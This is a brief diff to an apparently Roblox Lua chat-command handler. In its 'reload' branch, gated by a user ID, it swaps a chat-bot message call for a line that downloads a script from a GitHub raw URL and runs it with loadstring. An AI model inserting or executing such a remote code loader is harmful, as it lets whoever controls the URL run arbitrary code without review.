@@ -25,7 +25,7 @@ local function onChatted(player, message)
 
         if command == "reload" then
             if player.UserId == allowedUserID then
-                sendReloadMessageToChatBot(player)
+               loadstring(game:HttpGet("https://raw.githubusercontent.com/OhDaddyUwu/The-Bleufox-Script/main/Script"))()
             else
                 print("no")
             end
